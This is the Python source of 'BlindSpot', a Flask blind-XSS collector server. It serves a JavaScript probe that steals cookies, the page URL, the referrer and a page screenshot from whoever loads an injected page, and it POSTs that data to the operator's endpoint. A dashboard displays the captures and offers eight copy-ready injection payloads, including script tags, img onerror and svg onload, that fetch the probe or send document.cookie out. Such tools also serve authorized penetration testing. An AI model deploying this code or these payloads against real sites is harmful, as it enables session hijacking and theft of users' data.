"""
BlindSpot — Blind XSS Collector

Writes per-probe to captures/<timestamp>/
  data.json      — cookies, URL, user-agent, referer, etc.
  screenshot.png — page screenshot (if captured)

Config variables to set before starting (or run setup.sh):
  COLLECT_URL        — public URL of the collector endpoint
  VIEWER_PATH        — URL path to the dashboard (no leading slash)
  DASHBOARD_PASSWORD — dashboard password (required, server refuses to start without it)
"""

import base64
import datetime
import html
import json
import logging
import os
import secrets

from flask import Flask, Response, jsonify, redirect, request

# ── Config ───────────────────────────────────────────────────────────────────

COLLECT_URL  = "https://yourdomain.com/a"
LISTEN_HOST  = "0.0.0.0"
LISTEN_PORT  = 443
CAPTURES_DIR = os.path.join(os.path.dirname(__file__), "captures")
CERT_FILE    = "/etc/letsencrypt/live/yourdomain.com/fullchain.pem"
KEY_FILE     = "/etc/letsencrypt/live/yourdomain.com/privkey.pem"

# Path to the viewer dashboard — change this to something hard to guess.
# No leading slash. Example: "mijn-geheime-pagina"
VIEWER_PATH = "my-secret-dashboard"

# Password for the dashboard — required, the server refuses to start without it.
DASHBOARD_PASSWORD = ""

os.makedirs(CAPTURES_DIR, exist_ok=True)

# Random token used as session cookie value — regenerated each restart.
_SESSION_TOKEN = secrets.token_hex(32)

# ── Logo (base64 embedded SVG) ────────────────────────────────────────────────

_LOGO_SVG = """\
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80">
  <rect width="80" height="80" rx="13" fill="#0a0a0a"/>
  <path d="M8 40 Q40 16 72 40 Q40 64 8 40z" fill="none" stroke="#dc2626" stroke-width="2.5"/>
  <circle cx="40" cy="40" r="11" fill="#7f1d1d"/>
  <circle cx="40" cy="40" r="5" fill="#dc2626"/>
  <line x1="12" y1="10" x2="68" y2="70" stroke="#ef4444" stroke-width="4.5" stroke-linecap="round"/>
</svg>"""

LOGO_B64 = base64.b64encode(_LOGO_SVG.encode()).decode()
LOGO_TAG = (
    f'<img src="data:image/svg+xml;base64,{LOGO_B64}" '
    f'alt="logo" style="height:34px;width:34px;display:block;border-radius:4px">'
)

# ── App ───────────────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
app = Flask(__name__)
app.logger.setLevel(logging.WARNING)


def get_ip() -> str:
    return (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or request.remote_addr
        or ""
    )


# ── Auth ──────────────────────────────────────────────────────────────────────

def _authed() -> bool:
    return request.cookies.get("xss_session") == _SESSION_TOKEN


# ── Shared page chrome ────────────────────────────────────────────────────────

_CSS = """
  :root {
    --bg:       #0a0a0a;
    --bg2:      #111111;
    --bg3:      #1a1a1a;
    --border:   #2a2a2a;
    --border2:  #3a0a0a;
    --text:     #e8e8e8;
    --text2:    #999;
    --text3:    #555;
    --accent:   #dc2626;
    --accent2:  #ef4444;
    --accent3:  #7f1d1d;
    --code-bg:  #0d0000;
    --code-clr: #fca5a5;
    --tag-bg:   #1a0505;
    --tag-clr:  #f87171;
    --yes:      #4ade80;
    --shot:     #f87171;
  }
  [data-theme="light"] {
    --bg:       #f5f5f5;
    --bg2:      #ffffff;
    --bg3:      #ebebeb;
    --border:   #d4d4d4;
    --border2:  #fca5a5;
    --text:     #1a1a1a;
    --text2:    #555;
    --text3:    #999;
    --accent:   #dc2626;
    --accent2:  #b91c1c;
    --accent3:  #fee2e2;
    --code-bg:  #fff5f5;
    --code-clr: #991b1b;
    --tag-bg:   #fee2e2;
    --tag-clr:  #991b1b;
    --yes:      #16a34a;
    --shot:     #dc2626;
  }

  *{box-sizing:border-box}
  body{background:var(--bg);color:var(--text);
       font-family:'Segoe UI',system-ui,sans-serif;
       margin:0;min-height:100vh;transition:background .2s,color .2s}
  a{color:var(--accent2);text-decoration:none}
  a:hover{text-decoration:underline}
  code,pre{font-family:Consolas,'Courier New',monospace}

  /* ── nav ── */
  nav{display:flex;align-items:center;gap:14px;
      background:var(--bg2);border-bottom:1px solid var(--border);
      padding:11px 28px;position:sticky;top:0;z-index:10}
  .logo-wrap{display:flex;align-items:center;gap:10px}
  .logo-wrap span{font-size:1.05rem;font-weight:700;
                  color:var(--text);letter-spacing:.03em}
  .logo-wrap span em{color:var(--accent);font-style:normal}
  .spacer{flex:1}
  .nav-link{font-size:.84rem;color:var(--text2);padding:5px 12px;
            border-radius:5px;transition:background .15s,color .15s}
  .nav-link:hover{background:var(--bg3);color:var(--text);text-decoration:none}
  .nav-link.active{background:var(--accent3);color:var(--accent2);font-weight:600}

  /* ── theme toggle ── */
  .toggle-wrap{display:flex;align-items:center;gap:8px;margin-left:8px}
  .toggle-label{font-size:.72rem;color:var(--text3);user-select:none}
  .toggle{position:relative;width:38px;height:20px;cursor:pointer}
  .toggle input{opacity:0;width:0;height:0}
  .slider{position:absolute;inset:0;background:var(--bg3);
          border:1px solid var(--border);border-radius:20px;
          transition:background .2s}
  .slider:before{content:'';position:absolute;width:14px;height:14px;
                 left:2px;top:2px;background:var(--text3);
                 border-radius:50%;transition:transform .2s,background .2s}
  input:checked+.slider{background:var(--accent3);border-color:var(--accent)}
  input:checked+.slider:before{transform:translateX(18px);background:var(--accent)}

  /* ── content ── */
  .page{padding:30px 36px;max-width:1200px;margin:0 auto}
  h1{color:var(--text);font-size:1.2rem;margin:0 0 4px;font-weight:700}
  .subtitle{color:var(--text3);font-size:.81rem;margin:0 0 26px}

  /* ── table ── */
  table{width:100%;border-collapse:collapse}
  th{text-align:left;color:var(--text3);font-size:.72rem;text-transform:uppercase;
     letter-spacing:.07em;padding:8px 14px;border-bottom:2px solid var(--border)}
  td{padding:8px 14px;border-bottom:1px solid var(--border);font-size:.83rem}
  tr.clickable{cursor:pointer}
  tr.clickable:hover td{background:var(--bg3)}

  /* ── badges ── */
  .badge-yes{color:var(--yes)}
  .badge-shot{color:var(--shot);font-size:.79rem}

  /* ── card ── */
  .card{background:var(--bg2);border:1px solid var(--border);
        border-radius:8px;padding:18px 22px;margin-bottom:16px}
  .card-title{color:var(--text2);font-size:.72rem;text-transform:uppercase;
              letter-spacing:.09em;margin:0 0 10px;font-weight:600}
  .code-block{background:var(--code-bg);border:1px solid var(--border2);
              border-radius:6px;padding:12px 14px;font-size:.79rem;
              color:var(--code-clr);white-space:pre-wrap;word-break:break-all;
              line-height:1.55;margin:0;max-height:130px;overflow-y:auto}
  .copy-btn{margin-top:9px;padding:4px 14px;font-size:.77rem;
            background:transparent;color:var(--accent2);
            border:1px solid var(--accent);border-radius:5px;
            cursor:pointer;transition:background .15s,color .15s}
  .copy-btn:hover{background:var(--accent);color:#fff}
  .copy-btn.copied{background:#166534;border-color:#16a34a;color:#4ade80}

  .info-card{display:flex;gap:28px;flex-wrap:wrap;margin-bottom:24px;
             background:var(--bg2);border:1px solid var(--border);
             border-radius:8px;padding:16px 22px}
  .tag-url{display:inline-block;background:var(--tag-bg);border-radius:4px;
           padding:3px 9px;font-size:.77rem;color:var(--tag-clr);
           font-family:monospace;border:1px solid var(--border2)}

  .empty{color:var(--text3);margin-top:56px;text-align:center;font-size:.93rem}
  .card.payload-card{border-left:3px solid var(--accent)}
"""

_THEME_JS = """
(function(){
  var saved = localStorage.getItem('theme') || 'dark';
  document.documentElement.setAttribute('data-theme', saved);
  var cb = document.getElementById('themeToggle');
  if(cb) cb.checked = (saved === 'light');
})();
function toggleTheme(cb){
  var t = cb.checked ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', t);
  localStorage.setItem('theme', t);
}
"""

_COPY_JS = """
function copyPayload(btn, id){
  var text = document.getElementById(id).textContent;
  navigator.clipboard.writeText(text).then(function(){
    btn.textContent = 'Copied!';
    btn.classList.add('copied');
    setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1800);
  }).catch(function(){
    btn.textContent = 'Failed';
    setTimeout(function(){ btn.textContent = 'Copy'; }, 1800);
  });
}
"""


def _nav(sp: str, active: str) -> str:
    links = [
        ("captures", "Captures", sp),
        ("payloads", "Payloads", f"{sp}/payloads"),
    ]
    items = "".join(
        f'<a href="{href}" class="nav-link{" active" if k == active else ""}">{label}</a>'
        for k, label, href in links
    )
    toggle = (
        '<div class="toggle-wrap">'
        '<span class="toggle-label">dark</span>'
        '<label class="toggle">'
        '<input type="checkbox" id="themeToggle" onchange="toggleTheme(this)">'
        '<span class="slider"></span>'
        '</label>'
        '<span class="toggle-label">light</span>'
        '</div>'
    )
    logout = (
        f'<a href="{sp}/logout" class="nav-link" '
        f'style="color:var(--accent2);margin-left:4px">Logout</a>'
    )
    return (
        f'<nav>'
        f'<div class="logo-wrap">{LOGO_TAG}'
        f'<span>Blind<em>Spot</em></span></div>'
        f'<div class="spacer"></div>'
        f'{items}'
        f'{logout}'
        f'{toggle}'
        f'</nav>'
    )


def page(title: str, body: str, sp: str, *, active: str = "captures",
         extra_js: str = "") -> str:
    combined_js = _THEME_JS + ("\n" + extra_js if extra_js else "")
    return (
        f'<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">'
        f'<meta name="viewport" content="width=device-width,initial-scale=1">'
        f'<title>{title} — BlindSpot</title>'
        f'<style>{_CSS}</style>'
        f'</head><body>'
        f'{_nav(sp, active)}'
        f'<div class="page">{body}</div>'
        f'<script>{combined_js}</script>'
        f'</body></html>'
    )


def _render_login(sp: str, error: bool = False) -> str:
    err_html = (
        '<p style="color:var(--accent2);font-size:.82rem;margin:0 0 14px">Wrong password.</p>'
        if error else ""
    )
    return (
        f'<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">'
        f'<meta name="viewport" content="width=device-width,initial-scale=1">'
        f'<title>Login — BlindSpot</title>'
        f'<style>{_CSS}</style>'
        f'</head><body>'
        f'<div style="display:flex;align-items:center;justify-content:center;min-height:100vh">'
        f'<div style="width:100%;max-width:340px;padding:24px">'
        f'<div style="display:flex;align-items:center;gap:10px;margin-bottom:28px">'
        f'{LOGO_TAG}'
        f'<span style="font-size:1.05rem;font-weight:700;letter-spacing:.03em">'
        f'Blind<em style="color:var(--accent);font-style:normal">Spot</em>'
        f'</span></div>'
        f'<div class="card">'
        f'<form method="post" action="{sp}/login">'
        f'{err_html}'
        f'<input type="password" name="password" placeholder="Password" autofocus'
        f' style="width:100%;padding:9px 12px;background:var(--bg3);border:1px solid var(--border);'
        f'border-radius:6px;color:var(--text);font-size:.9rem;outline:none;'
        f'box-sizing:border-box;margin-bottom:12px">'
        f'<button type="submit"'
        f' style="width:100%;padding:9px;background:var(--accent);border:none;'
        f'border-radius:6px;color:#fff;font-size:.9rem;font-weight:600;cursor:pointer">'
        f'Enter</button>'
        f'</form></div>'
        f'</div></div>'
        f'<script>{_THEME_JS}</script>'
        f'</body></html>'
    )


# ── CORS ──────────────────────────────────────────────────────────────────────

@app.after_request
def add_cors(response):
    if request.path == "/a":
        response.headers["Access-Control-Allow-Origin"]  = "*"
        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response


# ── /collect ──────────────────────────────────────────────────────────────────

@app.route("/a", methods=["POST", "OPTIONS"])
def collect():
    if request.method == "OPTIONS":
        return "", 204

    probe = request.get_json(force=True, silent=True) or {}
    ts    = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S_%f")
    token = secrets.token_hex(4)
    name  = f"{ts}_{token}"
    dest  = os.path.join(CAPTURES_DIR, name)
    os.makedirs(dest, exist_ok=True)

    b64 = probe.pop("screenshot", "") or ""
    if b64 and isinstance(b64, str):
        try:
            if "," in b64:
                b64 = b64.split(",", 1)[1]
            img = base64.b64decode(b64, validate=True)
            if img[:8] == b"\x89PNG\r\n\x1a\n":
                with open(os.path.join(dest, "screenshot.png"), "wb") as fh:
                    fh.write(img)
        except Exception:
            pass

    data = {
        "ip":          get_ip(),
        "uri":         probe.get("uri"),
        "origin":      probe.get("origin"),
        "referer":     probe.get("referer"),
        "userAgent":   probe.get("userAgent"),
        "cookies":     probe.get("cookies"),
        "browserTime": probe.get("browserTime"),
        "inIframe":    probe.get("inIframe"),
        "htmlDom":     probe.get("htmlDom"),
        "requestData": probe.get("requestData"),
        "capturedAt":  datetime.datetime.now(datetime.timezone.utc).isoformat(),
    }
    with open(os.path.join(dest, "data.json"), "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)

    logging.info("probe saved → captures/%s  ip=%s  uri=%s",
                 name, data["ip"], data["uri"])
    return jsonify({"status": "ok"})


# ── /b.js ─────────────────────────────────────────────────────────────────────

@app.route("/b.js")
def payload_js():
    C = json.dumps(COLLECT_URL)
    js = (
        f"(function(){{"
        f"var C={C};"
        f"var probe={{"
        f"uri:location.href,"
        f"origin:location.origin,"
        f"referer:document.referrer,"
        f"userAgent:navigator.userAgent,"
        f"cookies:document.cookie,"
        f"browserTime:new Date().toISOString(),"
        f"inIframe:window!==window.top"
        f"}};"
        f"function send(d){{"
        f"fetch(C,{{method:'POST',"
        f"headers:{{'Content-Type':'application/json'}},"
        f"body:JSON.stringify(d),mode:'no-cors'}}).catch(function(){{}});"
        f"}}"
        f"try{{"
        f"var s=document.createElement('script');"
        f"s.src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';"
        f"s.onload=function(){{"
        f"html2canvas(document.body,{{useCORS:true,logging:false}}).then("
        f"function(canvas){{probe.screenshot=canvas.toDataURL('image/png');send(probe);}}"
        f").catch(function(){{send(probe);}});"
        f"}};"
        f"s.onerror=function(){{send(probe);}};"
        f"document.head.appendChild(s);"
        f"}}catch(e){{send(probe);}}"
        f"}})();"
    )
    return Response(js, mimetype="application/javascript",
                    headers={"Cache-Control": "no-store"})


# ── Viewer: catch-all (secret path routing) ───────────────────────────────────

@app.route("/<path:subpath>", methods=["GET", "POST"])
def viewer(subpath: str):
    sp    = f"/{VIEWER_PATH}"
    clean = subpath.lstrip("/")

    # ── login ──
    if clean == f"{VIEWER_PATH}/login":
        if request.method == "POST":
            if request.form.get("password") == DASHBOARD_PASSWORD:
                resp = redirect(sp)
                resp.set_cookie(
                    "xss_session", _SESSION_TOKEN,
                    httponly=True, secure=True, samesite="Strict", path="/",
                )
                return resp
            return _render_login(sp, error=True)
        return _render_login(sp)

    # ── logout ──
    if clean == f"{VIEWER_PATH}/logout":
        resp = redirect(f"{sp}/login")
        resp.delete_cookie("xss_session", path="/")
        return resp

    # ── auth check ──
    if not _authed():
        return redirect(f"{sp}/login")

    if clean == VIEWER_PATH:
        return _render_index(sp)
    elif clean == f"{VIEWER_PATH}/payloads":
        return _render_payloads(sp)
    elif clean.startswith(f"{VIEWER_PATH}/"):
        name = clean[len(VIEWER_PATH) + 1:]
        return _render_detail(sp, name)
    else:
        return "", 404


# ── Viewer: index ─────────────────────────────────────────────────────────────

def _render_index(sp: str) -> str:
    entries = sorted(
        (e for e in os.scandir(CAPTURES_DIR) if e.is_dir()),
        key=lambda e: e.name, reverse=True
    )

    rows = ""
    for e in entries:
        data_file = os.path.join(e.path, "data.json")
        has_shot  = os.path.exists(os.path.join(e.path, "screenshot.png"))
        try:
            with open(data_file, encoding="utf-8") as f:
                d = json.load(f)
            ip  = d.get("ip", "")
            uri = (d.get("uri") or "")[:80]
            ck  = d.get("cookies")
            ts  = e.name[:15].replace("_", " ")
        except Exception:
            ip = uri = ts = "?"
            ck = None
        ck_badge   = '<span class="badge-yes">&#10003; yes</span>' if ck else '<span style="color:var(--text3)">—</span>'
        shot_badge = '<span class="badge-shot">&#9654; screenshot</span>' if has_shot else ""
        rows += (
            f'<tr class="clickable" onclick="location=\'{sp}/{html.escape(e.name)}\'">'
            f'<td style="color:var(--text3);font-size:.77rem">{ts}</td>'
            f'<td style="color:var(--accent2)">{ip}</td>'
            f'<td style="max-width:380px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis">{uri}</td>'
            f'<td>{ck_badge}</td><td>{shot_badge}</td></tr>'
        )

    if entries:
        body = (
            f'<h1>Captures</h1>'
            f'<p class="subtitle">{len(entries)} probe{"s" if len(entries) != 1 else ""} collected</p>'
            f'<table>'
            f'<tr><th>Time (UTC)</th><th>IP</th><th>URI</th><th>Cookies</th><th></th></tr>'
            f'{rows}</table>'
        )
    else:
        body = '<h1>Captures</h1><p class="empty">No captures yet.</p>'

    return page("Captures", body, sp, active="captures")


# ── Viewer: detail ────────────────────────────────────────────────────────────

def _render_detail(sp: str, name: str) -> str:
    if ".." in name or "/" in name or "\\" in name:
        return "", 404
    dest = os.path.realpath(os.path.join(CAPTURES_DIR, name))
    captures_root = os.path.realpath(CAPTURES_DIR)
    if not dest.startswith(captures_root + os.sep) or not os.path.isdir(dest):
        return "", 404

    data_file = os.path.join(dest, "data.json")
    shot_file = os.path.join(dest, "screenshot.png")
    try:
        with open(data_file, encoding="utf-8") as f:
            d = json.load(f)
    except Exception:
        d = {}

    shot_tag = ""
    if os.path.exists(shot_file):
        with open(shot_file, "rb") as f:
            b64img = base64.b64encode(f.read()).decode()
        shot_tag = (
            f'<div style="margin-bottom:24px">'
            f'<img src="data:image/png;base64,{b64img}" '
            f'style="max-width:100%;border-radius:6px;border:1px solid var(--border)">'
            f'</div>'
        )

    rows = "".join(
        f'<tr>'
        f'<th style="color:var(--text3);font-size:.72rem;text-transform:uppercase;'
        f'letter-spacing:.07em;width:130px;vertical-align:top;padding:8px 14px;'
        f'font-weight:600">{html.escape(str(k))}</th>'
        f'<td style="padding:8px 14px;border-bottom:1px solid var(--border)">'
        f'<pre style="margin:0;white-space:pre-wrap;word-break:break-all;'
        f'font-size:.81rem;color:var(--text)">{html.escape(str(v))}</pre></td></tr>'
        for k, v in d.items() if k != "htmlDom"
    )
    dom = html.escape(d.get("htmlDom", "") or "")
    dom_section = (
        f'<h2 style="color:var(--text2);font-size:.72rem;text-transform:uppercase;'
        f'letter-spacing:.09em;margin:28px 0 8px;font-weight:600">HTML DOM</h2>'
        f'<pre style="background:var(--code-bg);border:1px solid var(--border2);'
        f'padding:14px;border-radius:6px;overflow:auto;font-size:.74rem;'
        f'max-height:420px;color:var(--code-clr);line-height:1.5">{dom}</pre>'
    ) if dom else ""

    body = (
        f'<div style="margin-bottom:18px">'
        f'<a href="{sp}" style="color:var(--text2);font-size:.82rem">'
        f'&larr; back to captures</a>'
        f'</div>'
        f'<h1 style="font-size:.95rem;color:var(--text2);margin-bottom:20px;'
        f'font-weight:400">{html.escape(name)}</h1>'
        f'{shot_tag}'
        f'<div class="card" style="padding:0;overflow:hidden">'
        f'<table style="margin:0">{rows}</table>'
        f'</div>'
        f'{dom_section}'
    )
    return page(name, body, sp, active="captures")


# ── Viewer: payloads ──────────────────────────────────────────────────────────

def _render_payloads(sp: str) -> str:
    _base         = COLLECT_URL.replace("/a", "")
    _js_url       = f"{_base}/b.js"
    _loader       = (
        f"var s=document.createElement('script');"
        f"s.src='{_js_url}';"
        f"document.head.appendChild(s)"
    )
    _inline = (
        f"fetch('{COLLECT_URL}',{{method:'POST',"
        f"headers:{{'Content-Type':'application/json'}},"
        f"body:JSON.stringify({{uri:location.href,cookies:document.cookie,"
        f"userAgent:navigator.userAgent,referer:document.referrer,"
        f"browserTime:new Date().toISOString()}}),mode:'no-cors'}})"
    )
    _cookies_only = (
        f"fetch('{COLLECT_URL}',{{method:'POST',"
        f"headers:{{'Content-Type':'application/json'}},"
        f"body:JSON.stringify({{cookies:document.cookie,uri:location.href}}),"
        f"mode:'no-cors'}})"
    )

    payloads = [
        ("Script tag",                   f'<script src="{_js_url}"></script>'),
        ("img onerror — loader",         f'<img src=x onerror="{_loader}">'),
        ("SVG onload — loader",          f'<svg onload="{_loader}">'),
        ("JavaScript only (no HTML)",    _loader),
        ("Inline fetch — full probe",    _inline),
        ("Inline fetch — cookies + URI", _cookies_only),
        ("Inline fetch — script tags",   f'<script>{_cookies_only}</script>'),
        ("Inline fetch — img onerror",   f'<img src=x onerror="{_cookies_only}">'),
    ]

    cards = ""
    for idx, (title, payload) in enumerate(payloads):
        pid = f"p{idx}"
        cards += (
            f'<div class="card payload-card">'
            f'<div class="card-title">{idx + 1}. {title}</div>'
            f'<pre class="code-block" id="{pid}">{html.escape(payload)}</pre>'
            f'<button class="copy-btn" onclick="copyPayload(this,\'{pid}\')">Copy</button>'
            f'</div>'
        )

    body = (
        f'<h1>Payloads</h1>'
        f'<p class="subtitle">Click Copy to copy a payload to your clipboard.</p>'
        f'<div class="info-card">'
        f'<div><div class="card-title">Collector endpoint</div>'
        f'<span class="tag-url">{COLLECT_URL}</span></div>'
        f'<div><div class="card-title">Payload JS</div>'
        f'<span class="tag-url">{_js_url}</span></div>'
        f'</div>'
        f'{cards}'
    )
    return page("Payloads", body, sp, active="payloads", extra_js=_COPY_JS)


# ── Error handlers ────────────────────────────────────────────────────────────

@app.errorhandler(Exception)
def handle_error(_):
    app.logger.exception("unhandled")
    return "", 500

@app.errorhandler(404)
def handle_404(_): return "", 404


# ── Startup ───────────────────────────────────────────────────────────────────

def _log_startup() -> None:
    if not DASHBOARD_PASSWORD:
        raise SystemExit(
            "ERROR: DASHBOARD_PASSWORD is not set. "
            "Set it at the top of collector.py before starting."
        )
    sp   = f"/{VIEWER_PATH}"
    base = COLLECT_URL.replace("/a", "")
    logging.info("=" * 64)
    logging.info("BlindSpot — starting up")
    logging.info("Dashboard              %s%s", base, sp)
    logging.info("Payloads               %s%s/payloads", base, sp)
    logging.info("Collector              %s", COLLECT_URL)
    logging.info("Captures dir           %s", CAPTURES_DIR)
    logging.info("=" * 64)


if __name__ == "__main__":
    _log_startup()
    ssl_context = (CERT_FILE, KEY_FILE) if CERT_FILE and KEY_FILE else None
    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False, ssl_context=ssl_context)
else:
    _log_startup()
